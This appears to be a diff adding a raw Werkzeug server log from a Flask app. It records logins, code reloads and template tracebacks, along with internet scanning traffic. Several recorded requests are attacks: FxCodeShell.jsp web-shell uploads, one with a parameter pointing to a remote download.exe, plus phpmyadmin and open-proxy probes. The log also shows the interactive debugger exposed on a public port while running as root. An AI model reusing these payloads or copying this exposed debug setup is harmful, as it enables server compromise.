@@ -1,0 +1,362 @@
+INFO:werkzeug:183.17.231.64 - - [12/Dec/2019 18:51:16] "GET /auth/logout HTTP/1.1" 302 -
+INFO:werkzeug:183.17.231.64 - - [12/Dec/2019 18:51:16] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:183.17.231.64 - - [12/Dec/2019 18:51:17] "GET /auth/login HTTP/1.1" 200 -
+INFO:root:<User 'root'>
+INFO:werkzeug:183.17.231.64 - - [12/Dec/2019 18:51:24] "POST /auth/login HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/root/flasky/app/auth/views.py', reloading
+INFO:werkzeug:183.17.231.64 - - [12/Dec/2019 18:52:47] "POST /auth/login HTTP/1.1" 200 -
+INFO:werkzeug:183.17.231.64 - - [12/Dec/2019 18:53:08] "POST /auth/login HTTP/1.1" 200 -
+INFO:werkzeug:183.17.231.64 - - [12/Dec/2019 18:54:40] "GET /auth/login HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/root/flasky/flasky.py', reloading
+INFO:werkzeug:183.17.231.64 - - [12/Dec/2019 19:47:25] "GET /auth/login HTTP/1.1" 200 -
+INFO:werkzeug:183.17.231.64 - - [12/Dec/2019 19:47:25] "GET /static/favicon.ico HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/root/flasky/flasky.py', reloading
+INFO:werkzeug:223.166.222.111 - - [12/Dec/2019 20:23:21] "POST /weixin?signature=1c1d33411d0e21ab3273bf54a1be69d5bd0ee0ba&timestamp=1576153401&nonce=1384866616&openid=ozW4es3hwcN0JLgo1_asoadMGgMI&encrypt_type=aes&msg_signature=7349141c39aa4b41fad63fa1186743ae22baa86d HTTP/1.1" 404 -
+INFO:werkzeug:163.177.13.2 - - [12/Dec/2019 20:46:23] "HEAD / HTTP/1.1" 200 -
+INFO:werkzeug:187.45.108.106 - - [12/Dec/2019 22:15:37] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:103.80.88.17 - - [12/Dec/2019 22:49:11] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:58.250.125.150 - - [12/Dec/2019 23:12:02] "GET /robots.txt HTTP/1.1" 404 -
+INFO:werkzeug:58.250.125.150 - - [12/Dec/2019 23:12:02] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:106.39.246.14 - - [12/Dec/2019 23:12:03] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:106.39.246.14 - - [12/Dec/2019 23:12:03] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:220.181.125.163 - - [12/Dec/2019 23:13:28] "GET /robots.txt HTTP/1.1" 404 -
+INFO:werkzeug:220.181.125.163 - - [12/Dec/2019 23:13:33] "GET /robots.txt HTTP/1.1" 404 -
+INFO:werkzeug:220.181.125.163 - - [12/Dec/2019 23:13:38] "GET /robots.txt HTTP/1.1" 404 -
+INFO:werkzeug:220.181.125.163 - - [12/Dec/2019 23:13:46] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:220.181.125.163 - - [12/Dec/2019 23:14:05] "GET /Product.aspx?pid=1180 HTTP/1.1" 404 -
+INFO:werkzeug:220.181.125.163 - - [12/Dec/2019 23:14:29] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:220.181.125.163 - - [12/Dec/2019 23:14:49] "GET /Product.aspx?pid=208 HTTP/1.1" 404 -
+INFO:werkzeug:220.181.125.163 - - [12/Dec/2019 23:15:07] "GET /Products.aspx?category=53&page=10 HTTP/1.1" 404 -
+INFO:werkzeug:220.181.125.163 - - [12/Dec/2019 23:19:21] "GET /Products.aspx?category=34&page=12 HTTP/1.1" 404 -
+INFO:werkzeug:103.49.6.54 - - [13/Dec/2019 00:08:38] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:103.49.6.54 - - [13/Dec/2019 00:08:39] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:47.98.104.143 - - [13/Dec/2019 00:47:34] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:101.132.73.45 - - [13/Dec/2019 00:57:32] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:169.197.108.42 - - [13/Dec/2019 01:28:41] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:51.77.111.172 - - [13/Dec/2019 02:28:16] "HEAD /robots.txt HTTP/1.0" 404 -
+INFO:werkzeug:163.177.13.2 - - [13/Dec/2019 03:06:13] "HEAD / HTTP/1.1" 200 -
+INFO:werkzeug:163.177.13.2 - - [13/Dec/2019 03:06:13] "HEAD / HTTP/1.1" 200 -
+INFO:werkzeug:1.4.195.159 - - [13/Dec/2019 04:36:39] "GET / HTTP/1.0" 200 -
+INFO:werkzeug:71.6.232.9 - - [13/Dec/2019 05:17:06] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:80.82.70.187 - - [13/Dec/2019 05:27:34] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 -
+INFO:werkzeug:78.97.175.87 - - [13/Dec/2019 06:00:05] "POST /editBlackAndWhiteList HTTP/1.1" 404 -
+INFO:werkzeug:120.24.68.238 - - [13/Dec/2019 06:26:14] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:120.24.68.238 - - [13/Dec/2019 06:26:14] "GET /index.php HTTP/1.1" 404 -
+INFO:werkzeug:120.24.68.238 - - [13/Dec/2019 08:38:09] "PUT /FxCodeShell.jsp%20 HTTP/1.1" 404 -
+INFO:werkzeug:120.24.68.238 - - [13/Dec/2019 08:38:09] "PUT /FxCodeShell.jsp::$DATA HTTP/1.1" 404 -
+INFO:werkzeug:120.24.68.238 - - [13/Dec/2019 08:38:09] "PUT /FxCodeShell.jsp/ HTTP/1.1" 404 -
+INFO:werkzeug:120.24.68.238 - - [13/Dec/2019 08:38:09] "GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fk.openyourass.club/download.exe HTTP/1.1" 404 -
+INFO:werkzeug:143.255.124.0 - - [13/Dec/2019 09:01:20] "POST /editBlackAndWhiteList HTTP/1.1" 404 -
+INFO:werkzeug:175.184.166.230 - - [13/Dec/2019 09:11:40] "HEAD http://123.125.114.144/ HTTP/1.1" 200 -
+INFO:werkzeug:171.34.177.153 - - [13/Dec/2019 09:11:42] "GET http://boxun.com/ HTTP/1.1" 200 -
+INFO:werkzeug:123.232.224.124 - - [13/Dec/2019 09:11:42] "CONNECT www.baidu.com:443 HTTP/1.1" 404 -
+INFO:werkzeug:221.204.147.83 - - [13/Dec/2019 09:11:44] "CONNECT www.ipip.net:443 HTTP/1.1" 404 -
+INFO:werkzeug:222.94.195.26 - - [13/Dec/2019 09:11:45] "GET http://www.rfa.org/english/ HTTP/1.1" 404 -
+INFO:werkzeug:121.57.227.204 - - [13/Dec/2019 09:11:49] "CONNECT www.voanews.com:443 HTTP/1.1" 404 -
+INFO:werkzeug:58.248.202.166 - - [13/Dec/2019 09:11:49] "GET http://www.123cha.com/ HTTP/1.1" 200 -
+INFO:werkzeug:222.94.195.26 - - [13/Dec/2019 09:11:50] "GET http://www.minghui.org/ HTTP/1.1" 200 -
+INFO:werkzeug:222.94.163.181 - - [13/Dec/2019 09:11:52] "CONNECT cn.bing.com:443 HTTP/1.1" 404 -
+INFO:werkzeug:60.208.165.180 - - [13/Dec/2019 09:11:52] "GET http://www.wujieliulan.com/ HTTP/1.1" 200 -
+INFO:werkzeug:175.152.30.98 - - [13/Dec/2019 09:11:53] "GET http://www.epochtimes.com/ HTTP/1.1" 200 -
+INFO:werkzeug:172.81.205.45 - - [13/Dec/2019 09:36:32] "HEAD /phpmyadmin/ HTTP/1.1" 404 -
+INFO:werkzeug:172.81.205.45 - - [13/Dec/2019 09:36:32] "HEAD /phpmyadmin HTTP/1.1" 404 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 10:06:36] "GET /auth/login HTTP/1.1" 500 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 10:06:36] "GET /auth/login?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 10:06:36] "GET /auth/login?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 10:06:36] "GET /auth/login?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 10:06:37] "GET /auth/login?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 10:06:37] "GET /auth/login?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 10:06:37] "GET /auth/login?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 10:06:47] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 10:06:47] "GET /static/favicon.ico HTTP/1.1" 304 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 10:06:50] "GET /auth/login HTTP/1.1" 500 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 10:06:50] "GET /auth/login?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 10:06:50] "GET /auth/login?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 10:06:50] "GET /auth/login?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 10:06:50] "GET /auth/login?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 10:06:50] "GET /auth/login?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug: * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 10:08:57] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 10:08:58] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 10:08:58] "GET /static/favicon.ico HTTP/1.1" 200 -
+ERROR:app:Exception on /auth/login [GET]
+Traceback (most recent call last):
+  File "/root/flasky/venv/lib/python3.7/site-packages/flask/app.py", line 2446, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/root/flasky/venv/lib/python3.7/site-packages/flask/app.py", line 1951, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/root/flasky/venv/lib/python3.7/site-packages/flask/app.py", line 1820, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/root/flasky/venv/lib/python3.7/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/root/flasky/venv/lib/python3.7/site-packages/flask/app.py", line 1949, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/root/flasky/venv/lib/python3.7/site-packages/flask/app.py", line 1935, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/root/flasky/app/auth/views.py", line 21, in login
+    return render_template('auth/login.html',form=form)
+  File "/root/flasky/venv/lib/python3.7/site-packages/flask/templating.py", line 140, in render_template
+    ctx.app,
+  File "/root/flasky/venv/lib/python3.7/site-packages/flask/templating.py", line 120, in _render
+    rv = template.render(context)
+  File "/root/flasky/venv/lib/python3.7/site-packages/jinja2/asyncsupport.py", line 76, in render
+    return original_render(self, *args, **kwargs)
+  File "/root/flasky/venv/lib/python3.7/site-packages/jinja2/environment.py", line 1008, in render
+    return self.environment.handle_exception(exc_info, True)
+  File "/root/flasky/venv/lib/python3.7/site-packages/jinja2/environment.py", line 780, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/root/flasky/venv/lib/python3.7/site-packages/jinja2/_compat.py", line 37, in reraise
+    raise value.with_traceback(tb)
+  File "/root/flasky/app/templates/auth/login.html", line 2, in top-level template code
+    {% import "bootstrap/wtf.html" as wtf %}
+  File "/root/flasky/venv/lib/python3.7/site-packages/jinja2/environment.py", line 1005, in render
+    return concat(self.root_render_func(self.new_context(vars)))
+  File "/root/flasky/app/templates/auth/login.html", line 17, in root
+    </div>
+  File "/root/flasky/app/templates/base.html", line 14, in root
+    <span class="icon-bar"></span>
+  File "/root/flasky/venv/lib/python3.7/site-packages/flask_bootstrap/templates/bootstrap/base.html", line 10, in root
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  File "/root/flasky/venv/lib/python3.7/site-packages/flask_bootstrap/templates/bootstrap/base.html", line 20, in block_doc
+    {% block body -%}
+  File "/root/flasky/venv/lib/python3.7/site-packages/flask_bootstrap/templates/bootstrap/base.html", line 39, in block_html
+  File "/root/flasky/venv/lib/python3.7/site-packages/flask_bootstrap/templates/bootstrap/base.html", line 92, in block_body
+  File "/root/flasky/app/templates/base.html", line 70, in block_content
+  File "/root/flasky/app/templates/auth/login.html", line 36, in block_page_content
+  File "/root/flasky/venv/lib/python3.7/site-packages/jinja2/runtime.py", line 262, in call
+    return __obj(*args, **kwargs)
+  File "/root/flasky/venv/lib/python3.7/site-packages/flask/helpers.py", line 370, in url_for
+    return appctx.app.handle_url_build_error(error, endpoint, values)
+  File "/root/flasky/venv/lib/python3.7/site-packages/flask/app.py", line 2215, in handle_url_build_error
+    reraise(exc_type, exc_value, tb)
+  File "/root/flasky/venv/lib/python3.7/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/root/flasky/venv/lib/python3.7/site-packages/flask/helpers.py", line 358, in url_for
+    endpoint, values, method=method, force_external=external
+  File "/root/flasky/venv/lib/python3.7/site-packages/werkzeug/routing.py", line 2020, in build
+    raise BuildError(endpoint, values, method, self)
+werkzeug.routing.BuildError: Could not build url for endpoint 'auth.register'. Did you mean 'auth.login' instead?
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 10:09:01] "GET /auth/login?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 500 -
+ERROR:app:Exception on /auth/login [GET]
+Traceback (most recent call last):
+  File "/root/flasky/venv/lib/python3.7/site-packages/flask/app.py", line 2446, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/root/flasky/venv/lib/python3.7/site-packages/flask/app.py", line 1951, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/root/flasky/venv/lib/python3.7/site-packages/flask/app.py", line 1820, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/root/flasky/venv/lib/python3.7/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/root/flasky/venv/lib/python3.7/site-packages/flask/app.py", line 1949, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/root/flasky/venv/lib/python3.7/site-packages/flask/app.py", line 1935, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/root/flasky/app/auth/views.py", line 21, in login
+    return render_template('auth/login.html',form=form)
+  File "/root/flasky/venv/lib/python3.7/site-packages/flask/templating.py", line 140, in render_template
+    ctx.app,
+  File "/root/flasky/venv/lib/python3.7/site-packages/flask/templating.py", line 120, in _render
+    rv = template.render(context)
+  File "/root/flasky/venv/lib/python3.7/site-packages/jinja2/asyncsupport.py", line 76, in render
+    return original_render(self, *args, **kwargs)
+  File "/root/flasky/venv/lib/python3.7/site-packages/jinja2/environment.py", line 1008, in render
+    return self.environment.handle_exception(exc_info, True)
+  File "/root/flasky/venv/lib/python3.7/site-packages/jinja2/environment.py", line 780, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/root/flasky/venv/lib/python3.7/site-packages/jinja2/_compat.py", line 37, in reraise
+    raise value.with_traceback(tb)
+  File "/root/flasky/app/templates/auth/login.html", line 2, in top-level template code
+    {% import "bootstrap/wtf.html" as wtf %}
+  File "/root/flasky/venv/lib/python3.7/site-packages/jinja2/environment.py", line 1005, in render
+    return concat(self.root_render_func(self.new_context(vars)))
+  File "/root/flasky/app/templates/auth/login.html", line 17, in root
+    </div>
+  File "/root/flasky/app/templates/base.html", line 14, in root
+    <span class="icon-bar"></span>
+  File "/root/flasky/venv/lib/python3.7/site-packages/flask_bootstrap/templates/bootstrap/base.html", line 10, in root
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  File "/root/flasky/venv/lib/python3.7/site-packages/flask_bootstrap/templates/bootstrap/base.html", line 20, in block_doc
+    {% block body -%}
+  File "/root/flasky/venv/lib/python3.7/site-packages/flask_bootstrap/templates/bootstrap/base.html", line 39, in block_html
+  File "/root/flasky/venv/lib/python3.7/site-packages/flask_bootstrap/templates/bootstrap/base.html", line 92, in block_body
+  File "/root/flasky/app/templates/base.html", line 70, in block_content
+  File "/root/flasky/app/templates/auth/login.html", line 36, in block_page_content
+  File "/root/flasky/venv/lib/python3.7/site-packages/jinja2/runtime.py", line 262, in call
+    return __obj(*args, **kwargs)
+  File "/root/flasky/venv/lib/python3.7/site-packages/flask/helpers.py", line 370, in url_for
+    return appctx.app.handle_url_build_error(error, endpoint, values)
+  File "/root/flasky/venv/lib/python3.7/site-packages/flask/app.py", line 2215, in handle_url_build_error
+    reraise(exc_type, exc_value, tb)
+  File "/root/flasky/venv/lib/python3.7/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/root/flasky/venv/lib/python3.7/site-packages/flask/helpers.py", line 358, in url_for
+    endpoint, values, method=method, force_external=external
+  File "/root/flasky/venv/lib/python3.7/site-packages/werkzeug/routing.py", line 2020, in build
+    raise BuildError(endpoint, values, method, self)
+werkzeug.routing.BuildError: Could not build url for endpoint 'auth.register'. Did you mean 'auth.login' instead?
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 10:09:03] "GET /auth/login HTTP/1.1" 500 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 10:09:33] "GET /auth/login HTTP/1.1" 500 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 10:09:33] "GET /auth/login?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 10:09:33] "GET /auth/login?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 10:09:33] "GET /auth/login?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 10:09:34] "GET /auth/login?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 10:09:34] "GET /auth/login?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 10:09:34] "GET /auth/login?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug:79.142.196.131 - - [13/Dec/2019 10:29:09] "GET / HTTP/1.1" 200 -
+INFO:werkzeug:201.49.233.176 - - [13/Dec/2019 10:46:33] "GET / HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/root/flasky/app/auth/views.py', reloading
+INFO:werkzeug: * Restarting with stat
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:03:31] "GET /auth/login HTTP/1.1" 500 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:03:31] "GET /auth/login?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:03:31] "GET /auth/login?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:03:31] "GET /auth/login?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:03:31] "GET /auth/login?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:03:31] "GET /auth/login?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:03:32] "GET /auth/login?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:04:21] "GET /auth/lout HTTP/1.1" 404 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:04:26] "GET /auth/logout HTTP/1.1" 302 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:04:27] "GET /auth/login?next=%2Fauth%2Flogout HTTP/1.1" 500 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:04:27] "GET /auth/login?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:04:27] "GET /auth/login?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:04:27] "GET /auth/login?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:04:27] "GET /auth/login?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:04:27] "GET /auth/login?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:05:43] "GET /auth/login?next=%2Fauth%2Flogout HTTP/1.1" 500 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:05:43] "GET /auth/login?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:05:43] "GET /auth/login?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:05:43] "GET /auth/login?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:05:43] "GET /auth/login?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:05:43] "GET /auth/login?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:05:44] "GET /auth/login?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:05:49] "GET /auth/login HTTP/1.1" 500 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:05:49] "GET /auth/login?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:05:49] "GET /auth/login?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:05:49] "GET /auth/login?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:05:49] "GET /auth/login?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:05:49] "GET /auth/login?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:16:04] "GET /auth/login HTTP/1.1" 500 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:16:04] "GET /auth/login?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:16:04] "GET /auth/login?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:16:04] "GET /auth/login?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:16:04] "GET /auth/login?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:16:04] "GET /auth/login?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/root/flasky/app/auth/views.py', reloading
+INFO:werkzeug: * Restarting with stat
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:17:08] "GET /auth/login HTTP/1.1" 500 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:17:08] "GET /auth/login?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:17:08] "GET /auth/login?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:17:08] "GET /auth/login?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:17:08] "GET /auth/login?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:17:08] "GET /auth/login?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:17:08] "GET /auth/login?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/root/flasky/app/auth/views.py', reloading
+INFO:werkzeug: * Restarting with stat
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:17:52] "GET /auth/login HTTP/1.1" 500 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:17:52] "GET /auth/login?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:17:52] "GET /auth/login?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:17:52] "GET /auth/login?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:17:52] "GET /auth/login?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:17:52] "GET /auth/login?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:17:52] "GET /auth/login?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/root/flasky/app/auth/views.py', reloading
+INFO:werkzeug: * Restarting with stat
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:18:18] "GET /auth/login HTTP/1.1" 500 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:18:18] "GET /auth/login?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:18:18] "GET /auth/login?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:18:18] "GET /auth/login?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:18:18] "GET /auth/login?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:18:18] "GET /auth/login?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:18:19] "GET /auth/login?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/root/flasky/app/auth/views.py', reloading
+INFO:werkzeug: * Restarting with stat
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:18:36] "GET /auth/login HTTP/1.1" 500 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:18:36] "GET /auth/login?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:18:36] "GET /auth/login?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:18:36] "GET /auth/login?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:18:36] "GET /auth/login?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:18:36] "GET /auth/login?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:18:37] "GET /auth/login?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/root/flasky/app/auth/views.py', reloading
+INFO:werkzeug: * Restarting with stat
+INFO:werkzeug:183.17.230.171 - - [13/Dec/2019 11:18:55] "GET /auth/login HTTP/1.1" 500 -
